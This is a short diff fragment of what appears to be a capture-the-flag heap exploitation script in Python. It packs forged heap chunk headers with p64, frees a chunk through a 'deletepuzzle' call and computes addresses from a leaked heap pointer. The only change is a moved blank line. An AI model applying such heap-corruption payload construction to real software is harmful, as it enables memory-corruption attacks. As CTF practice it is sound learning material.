@@ -106,8 +106,8 @@ if __name__ == '__main__':
 			p64(0)+p64(0x61)+\
 			p64(0)*10+\
 			p64(0)+p64(0x61)).ljust(0x100,b'A'))#5
-
 	deletepuzzle(4)
+	
 	L_STR = p64(0x0)*4+\
 		p64(0x0)+p64(0x51)+\
 		p64(heap_leak+0xc20)+p64(heap_leak+0xbe0)+\
